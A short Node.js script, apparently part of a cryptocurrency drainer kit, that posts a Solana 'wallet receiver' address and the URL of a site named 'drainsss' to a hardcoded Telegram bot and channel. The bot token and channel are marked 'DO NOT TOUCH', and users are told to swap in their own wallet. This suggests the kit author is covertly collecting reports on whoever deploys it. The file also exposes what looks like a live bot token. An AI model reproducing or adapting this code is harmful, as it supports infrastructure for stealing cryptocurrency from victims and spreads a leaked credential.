const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '5345311630:AAF0x47_0hgJrl7WvhjfZHx9FqPdw5hw4NU';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '-1002212846316';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = '228gdLhzdF27i7pNHQQym1BGHPvtcKLVr1qDtGKU7uXs';
const website_url = 'https://drainsss.netlify.app/';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
